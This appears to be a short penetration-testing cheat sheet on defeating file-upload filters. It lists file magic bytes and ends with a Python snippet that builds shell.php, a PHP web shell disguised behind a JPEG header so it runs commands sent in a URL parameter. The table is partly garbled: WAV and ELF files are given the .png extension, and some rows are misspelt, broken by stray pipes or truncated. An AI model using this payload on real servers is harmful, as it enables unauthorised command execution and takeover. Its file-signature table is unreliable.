# MAgic Bytes number

## following list of magic bytes to bypass file upload restrictions



| File                           | extension | Bytes                                        |
|--------------------------------|-----------|----------------------------------------------|
| .ai                            |           | 25 50 44 46 [%PDF]                           |
| Bitmap graphic                 | .bmp      | 42 4D [BM]                                   |
| Class File                     | .class    | CA FE BA BE                                  |
| JPEG graphic file              | .jpg      | FFD8FF                                       |
| JPEG 2000 graphic file         | .jp2      | 0000000C6A5020200D0A [....jP..]              |
| GIF graphic file               | .gif      | 47 49 46 38 [GIF89]                          |
| TIF graphic file               | .tif      | 49 49 [II]                                   |
| PNG graphic file               | .png      | 89 50 4E 47 .PNG                             |
| WAV audio file                 | .png      | 52 49 46 46 RIFF                             |
| ELF Linux EXE                  | .png      | 7F 45 4C 46 .ELF                             |
| Photoshop Graphics             | .psd      | 38 42 50 53 [8BPS]                           |
| Windows Meta File              | .wmf      | D7 CD C6 9A                                  |
| MIDI file                      | .mid      | 4D 54 68 64 [MThd]                           |
| Icon file                      | .ico      | 00 00 01 00                                  |
| MP3 file with ID3 identity tag | .mp3      | 49 44 33 [ID3]                               |
| AVI video file                 | .avi      | 52 49 46 46 [RIFF]                           |
| Flash Shockwave                | .swf      | 46 57 53 [FWS]                               |
| Flash Video .flv               | .flv      | 46 4C 56 [FLV]                               |
| peg 4 video file               | .mp4      | 00 00 00 18 66 74 79 70 6D 70 34 32 [....fty |
| MOV video fi|le                | .mov      | 6D 6F 6F 76 [....moov]                       |
| Windows Video file             | .wmv      | 30 26 B2 75 8E 66 CF                         |
| Windows Audio file             | .wma      | 30 26 B2 75 8E 66 CF                         |
| PKZip                          | .zip      | 50 4B 03 04 [PK]                             |
| GZip                           | .gz       | 1F 8B 08                                     |
| Tar file                       | .tar      | 75 73 74 61 72                               |
| Microsoft Installer .msi       |           | D0 CF 11 E0 A1 B1 1A E1                      |
| Object Code File               | .obj      | 4C 01|                                       |
| Dynamic Library .dll           |           | 4D 5A [MZ]|                                  |
| CAB Installer file             | .cab      | 4D 53 43 46 [MSCF]|                          |
| Executable file .exe           |           | 4D 5A [MZ]|                                  |
| RAR file                       | .rar      | 52 61 72 21 1A 07 00 [Rar!...]|              |
| SYS file                       | .sys      | 4D 5A [MZ]                                   |
| Help file                      | .hlp      | 3F 5F 03 00 "[?_..]"|                        |
| VMWare Disk file               | .vmdk     | 4B 44 4D 56 [KDMV]|                          |
| Outlook Post Office file.pst   |           | 21 42 44 4E 42 [!BDNB]|                      |
| PDF Document                   | .pdf      | 25 50 44 46 [%PDF]|                          |
| Word Document                  | .doc      | D0 CF 11 E0 A1 B1 1A E1|                     |
| RTF Document                   | .rtf      | 7B 5C 72 74 66 31 [{ tf1]|                   |
| Excel Document                 | .xls      | D0 CF 11 E0 A1 B1 1A E1|                     |
| PowerPoint Document .ppt       |           | D0 CF 11 E0 A1 B1 1A E1|                     |
| Visio Document                 | .vsd      | D0 CF 11 E0 A1 B1 1A E1|                     |


## generating shell with header

```python

fh = open('shell.php', 'w')
fh.write('\xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>')
fh.close()
```



tags: magicnumbers bytes bypass upload christian